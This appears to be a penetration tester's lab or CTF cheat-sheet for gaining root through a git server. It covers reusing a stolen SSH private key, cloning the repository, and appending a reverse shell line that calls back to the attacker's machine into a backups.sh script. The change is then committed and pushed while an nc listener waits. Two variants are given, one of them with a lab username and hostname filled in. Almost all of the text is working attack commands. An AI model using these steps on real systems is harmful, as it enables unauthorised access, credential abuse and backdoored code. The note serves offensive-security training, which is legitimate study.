#### Git user exists

A git user appears in the /home directory.

Let's copy the .ssh/id_rsa file to kali, then use it to ssh in.

```bash - kali
chmod 600 id_rsa
```

```bash - kali
ssh git@$TARGET -i id_rsa -p 22
```

Now that we have confirmed this works, we can use GIT SSH to clone the repository down to kali.

```bash - kali
GIT_SSH_COMMAND='ssh -i id_rsa -p 22' git clone git@$TARGET:/git-server
```


```bash - kali
cd git-server
```

Configure our Git identity.
```bash - kali
git config --global user.name "kali"
```

```bash - kali
git config --global user.email "kali@kali.(none)"
```

Echo in our reverse shell.
```bash - kali
echo "sh -i >& /dev/tcp/$KALI/8080 0>&1" >> backups.sh 
```

```bash - kali
chmod +x backups.sh
```

Now we add and commit changes.
```bash - target
git add -A
```

```bash - target
git commit -m "pwn"
```


```bash - kali
sudo rlwrap -cAr nc -lvnp 8080
```

```bash - kali
GIT_SSH_COMMAND='ssh -i ../id_rsa -p 43022' git push origin master
```


---
---

#### Have commit privs


```bash - target
git clone file://git-server
```

```bash - target
ls -la git-server
```

```bash - target
cd git-server
```

```bash - target
git log
```

```bash - target
cat backup.sh
```

```bash - target
git config --global user.name "<USER>"
```

>git config --global user.name "dademola"

```bash - target
git config --global user.email "<USER>@<HOSTNAME>.(none)"
```

>git config --global user.email "dademola@hunit.(none)"

Run a test command for root execution.
```bash - target
echo "sh -i >& /dev/tcp/$KALI/8080 0>&1" >> backups.sh 
```

```bash - target
chmod +x backups.sh 
```

```bash - target
git add -A
```

```bash - target
git commit -m "pwn"
```

If this method fails, try [[13._Git Server#Git user exists]]

```bash - kali
sudo rlwrap -cAr nc -lvnp 8080
```

```bash - target
git push origin master
```
